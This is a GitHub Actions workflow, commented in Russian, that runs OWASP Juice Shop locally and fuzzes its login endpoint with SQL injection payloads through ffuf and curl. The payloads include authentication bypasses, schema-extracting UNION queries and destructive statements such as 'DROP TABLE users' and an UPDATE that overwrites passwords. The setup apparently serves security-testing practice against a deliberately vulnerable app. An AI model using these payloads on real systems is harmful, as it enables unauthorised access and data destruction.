name: Juice Shop SQL Injection Fuzzing

on:
  push:
    branches: [ main ]
  workflow_dispatch:  # Для ручного запуска

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf-sql-injection:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Start Juice Shop container
        run: |
          # Запускаем Juice Shop
          docker run -d \
            --name juice-shop \
            -p 3000:3000 \
            bkimminich/juice-shop:latest
          
          echo "Waiting for Juice Shop to start..."
          # Увеличиваем время ожидания и проверяем доступность
          for i in {1..30}; do
            if curl -s -f http://localhost:3000 > /dev/null; then
              echo "Juice Shop is up and running!"
              break
            fi
            echo "Waiting for Juice Shop to start... ($i/30)"
            sleep 2
          done
          
          # Финальная проверка
          if ! curl -s -f http://localhost:3000 > /dev/null; then
            echo "ERROR: Juice Shop failed to start"
            docker logs juice-shop
            exit 1
          fi
          
      - name: Install ffuf
        run: |
          # Устанавливаем ffuf
          wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
          tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
          chmod +x ffuf
          sudo mv ffuf /usr/local/bin/
          
      - name: Prepare SQL injection payloads
        run: |
          echo "Preparing SQL injection payloads..."
          
          # Используем локальный файл SQL-Injection.txt
          if [ -f "SQL-Injection.txt" ]; then
            echo "Using local SQL-Injection.txt file"
            cp SQL-Injection.txt base-payloads.txt
          else
            # Если файла нет, создаем базовые payloads
            echo "Creating basic payloads"
            echo "'" > base-payloads.txt
            echo "''" >> base-payloads.txt
            echo "' OR '1'='1" >> base-payloads.txt
            echo "' OR 1=1--" >> base-payloads.txt
            echo "' OR 1=1;--" >> base-payloads.txt
            echo '" OR "1"="1"' >> base-payloads.txt
            echo "admin' OR '1'='1" >> base-payloads.txt
            echo "admin' OR 1=1--" >> base-payloads.txt
            echo "' UNION SELECT null,null--" >> base-payloads.txt
            echo "' UNION SELECT 1,2--" >> base-payloads.txt
          fi
          
          # Создаем специфичные для SQLite payloads
          echo "Creating SQLite-specific payloads..."
          echo "' OR '1'='1'--'" > sqlite-payloads.txt
          echo "' OR '1'='1'/*" >> sqlite-payloads.txt
          echo "admin@juice-sh.op' OR '1'='1" >> sqlite-payloads.txt
          echo "admin@juice-sh.op' OR 1=1--" >> sqlite-payloads.txt
          echo "admin@juice-sh.op'--" >> sqlite-payloads.txt
          echo "' OR 1=1 LIMIT 1--" >> sqlite-payloads.txt
          echo "'; SELECT SLEEP(5)--" >> sqlite-payloads.txt
          echo "' OR 1=1 AND (SELECT 1 FROM sqlite_master)--" >> sqlite-payloads.txt
          echo "' OR EXISTS(SELECT * FROM sqlite_master)--" >> sqlite-payloads.txt
          echo "'; PRAGMA table_info(users);--" >> sqlite-payloads.txt
          echo "' UNION SELECT name FROM sqlite_master WHERE type='table'--" >> sqlite-payloads.txt
          echo "' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--" >> sqlite-payloads.txt
          echo "' AND (SELECT COUNT(*) FROM sqlite_master) > 0--" >> sqlite-payloads.txt
          echo "' OR 'a'='a" >> sqlite-payloads.txt
          echo "' OR 'x'='x" >> sqlite-payloads.txt
          echo "' IS NULL;--" >> sqlite-payloads.txt
          echo "'; DROP TABLE users;--" >> sqlite-payloads.txt
          echo "'; UPDATE users SET password='hacked';--" >> sqlite-payloads.txt
          echo "' OR (SELECT 1 FROM users WHERE email='admin@juice-sh.op')=1--" >> sqlite-payloads.txt
          echo "' OR (SELECT COUNT(*) FROM users) > 0--" >> sqlite-payloads.txt
          echo "' OR (SELECT email FROM users LIMIT 1)='admin@juice-sh.op'--" >> sqlite-payloads.txt
          echo "' OR 1=1 AND (SELECT LENGTH(password) FROM users WHERE email='admin@juice-sh.op') > 0--" >> sqlite-payloads.txt
          
          # Объединяем все payloads, удаляем пустые строки и дубликаты
          cat base-payloads.txt sqlite-payloads.txt | sed '/^$/d' | sort -u > unique-payloads.txt
          
          echo "Total unique payloads prepared: $(wc -l < unique-payloads.txt)"
          echo "First 10 payloads:"
          head -10 unique-payloads.txt
          
      - name: Test login endpoint (baseline)
        run: |
          echo "Testing baseline login with invalid credentials..."
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"test@test.com","password":"test"}' \
            -o baseline-response.txt \
            -s -w "Status: %{http_code}, Size: %{size_download}, Time: %{time_total}s\n"
          echo "Baseline response saved"
          
      - name: Run ffuf fuzzing for SQL injection
        run: |
          echo "Starting SQL injection fuzzing on login endpoint..."
          echo "Total payloads to test: $(wc -l < unique-payloads.txt)"
          
          # Сначала тестируем на стандартном адресе администратора Juice Shop
          echo "=== Testing with admin email context ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"admin@juice-sh.opFUZZ","password":"password"}' \
            -w unique-payloads.txt \
            -t 10 \
            -p 0.5 \
            -o ffuf-results-admin-context.json \
            -of json \
            -fr "Invalid email or password" \
            -mc all \
            -v 2>&1 | tee ffuf-output-admin.txt
            
          # Тестируем с чистым email полем
          echo -e "\n=== Testing with clean email field ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ","password":"password"}' \
            -w unique-payloads.txt \
            -t 10 \
            -p 0.5 \
            -o ffuf-results-clean.json \
            -of json \
            -fr "Invalid email or password" \
            -mc all \
            -v 2>&1 | tee ffuf-output-clean.txt
            
          # Тестируем password поле
          echo -e "\n=== Testing password field ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
            -w unique-payloads.txt \
            -t 10 \
            -p 0.5 \
            -o ffuf-results-password.json \
            -of json \
            -fr "Invalid email or password" \
            -mc all \
            -v 2>&1 | tee ffuf-output-password.txt
            
      - name: Analyze fuzzing results
        run: |
          echo "=== Analyzing fuzzing results ==="
          
          # Устанавливаем jq для анализа JSON
          sudo apt-get update && sudo apt-get install -y jq
          
          # Функция для анализа результатов
          analyze_results() {
            local input_file=$1
            local output_file=$2
            
            if [ -f "$input_file" ]; then
              echo "Analyzing $input_file..."
              # Ищем успешные ответы (не 401 и не 500)
              jq '.results[] | select(.status != 401 and .status != 500) | {input: .input.FUZZ, status: .status, length: .length, words: .words, lines: .lines}' "$input_file" > "$output_file" 2>/dev/null || true
              
              if [ -s "$output_file" ]; then
                echo "POTENTIAL HITS FOUND in $input_file!"
                echo "Count: $(jq -s 'length' "$output_file" 2>/dev/null || echo 0)"
                cat "$output_file"
              else
                echo "No potential hits found in $input_file"
              fi
            else
              echo "File $input_file not found"
            fi
          }
          
          # Анализируем все результаты
          analyze_results "ffuf-results-admin-context.json" "potential-hits-admin.json"
          analyze_results "ffuf-results-clean.json" "potential-hits-clean.json"
          analyze_results "ffuf-results-password.json" "potential-hits-password.json"
          
      - name: Manual SQL injection tests
        run: |
          echo "=== Running manual SQL injection tests ==="
          
          # Создаем файл для результатов ручных тестов
          cat > manual-tests.md << 'EOF'
          # Manual SQL Injection Test Results
          ## Test Date: $(date)
          
          EOF
          
          # Функция для выполнения и записи теста
          run_test() {
            local test_name="$1"
            local email="$2"
            local password="$3"
            
            echo "### $test_name" >> manual-tests.md
            echo "**Payload:** email=\`$email\`, password=\`$password\`" >> manual-tests.md
            
            response=$(curl -X POST http://localhost:3000/rest/user/login \
              -H "Content-Type: application/json" \
              -d "{\"email\":\"$email\",\"password\":\"$password\"}" \
              -s -w "\nStatus: %{http_code}, Size: %{size_download}, Time: %{time_total}s" \
              -o response.tmp 2>/dev/null)
            
            status_code=$(echo "$response" | grep "Status:" | cut -d' ' -f2 2>/dev/null || echo "Unknown")
            echo "**Response:** Status $status_code" >> manual-tests.md
            
            # Проверяем содержимое ответа
            if echo "$response" | grep -q "Authentication" || [ "$status_code" != "401" ] 2>/dev/null; then
              echo "**Result:** ⚠️ POTENTIAL SUCCESS (non-401 response)" >> manual-tests.md
              echo "**Response body:**" >> manual-tests.md
              echo '```json' >> manual-tests.md
              cat response.tmp 2>/dev/null | head -20 >> manual-tests.md
              echo '```' >> manual-tests.md
            else
              echo "**Result:** ✅ Normal authentication failure" >> manual-tests.md
            fi
            
            echo "" >> manual-tests.md
            rm -f response.tmp 2>/dev/null || true
          }
          
          # Выполняем тесты
          run_test "Test 1: Basic SQL Injection" "' OR '1'='1" "password"
          run_test "Test 2: Admin with SQL comment" "admin@juice-sh.op'--" "anything"
          run_test "Test 3: Admin with OR condition" "admin@juice-sh.op' OR '1'='1" "anything"
          run_test "Test 4: Admin with always true" "admin@juice-sh.op' OR 1=1--" "anything"
          run_test "Test 5: Union injection" "' UNION SELECT null,null--" "anything"
          run_test "Test 6: SQLite specific" "' OR (SELECT 1 FROM users WHERE email='admin@juice-sh.op')=1--" "anything"
          
          echo "Manual tests completed. Check manual-tests.md for results."
          
      - name: Get Juice Shop logs
        if: always()
        run: |
          echo "Getting Juice Shop logs..."
          docker logs juice-shop > juice-logs.log 2>&1 || true
          echo "Last 50 lines of logs:"
          tail -50 juice-logs.log || true
          
      - name: Stop Juice Shop container
        if: always()
        run: |
          echo "Stopping Juice Shop container..."
          docker stop juice-shop 2>/dev/null || true
          docker rm juice-shop 2>/dev/null || true
          
      - name: Upload fuzzing results as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sql-injection-results
          path: |
            ffuf-results-*.json
            ffuf-output-*.txt
            potential-hits-*.json
            baseline-response.txt
            juice-logs.log
            unique-payloads.txt
            manual-tests.md
          retention-days: 7
          
      - name: Create summary report
        if: always()
        run: |
          echo "Creating summary report..."
          
          # Считаем общее количество payloads
          total_payloads=$(wc -l < unique-payloads.txt 2>/dev/null || echo "0")
          
          cat > summary-report.md << EOF
# SQL Injection Fuzzing Report - Juice Shop

## Test Details
- Application: OWASP Juice Shop
- Target: /rest/user/login (POST)
- Test Date: $(date)
- Total Payloads Tested: $total_payloads

## Results Summary
EOF
          
          # Проверяем найденные уязвимости
          found_vulns=false
          
          for hit_file in potential-hits-admin.json potential-hits-clean.json potential-hits-password.json; do
            if [ -f "$hit_file" ] && [ -s "$hit_file" ]; then
              found_vulns=true
              echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND in ${hit_file##*/}!" >> summary-report.md
              echo '```json' >> summary-report.md
              cat "$hit_file" >> summary-report.md
              echo '```' >> summary-report.md
            fi
          done
          
          if [ "$found_vulns" = false ]; then
            echo -e "\n## ✅ No SQL injections detected automatically" >> summary-report.md
          fi
          
          echo -e "\n## Manual Test Results" >> summary-report.md
          if [ -f "manual-tests.md" ]; then
            # Пропускаем первые 2 строки (заголовок)
            tail -n +3 manual-tests.md >> summary-report.md
          else
            echo "Manual tests were not completed or results are missing." >> summary-report.md
          fi
          
          cat >> summary-report.md << 'EOF'

## Recommendations
1. Review the full fuzzing results in the artifacts
2. Check Juice Shop logs for SQL error messages
3. Try time-based blind SQL injection payloads
4. Test other endpoints for SQL injection vulnerabilities
EOF
          
      - name: Upload summary report
        uses: actions/upload-artifact@v4
        with:
          name: summary-report
          path: summary-report.md
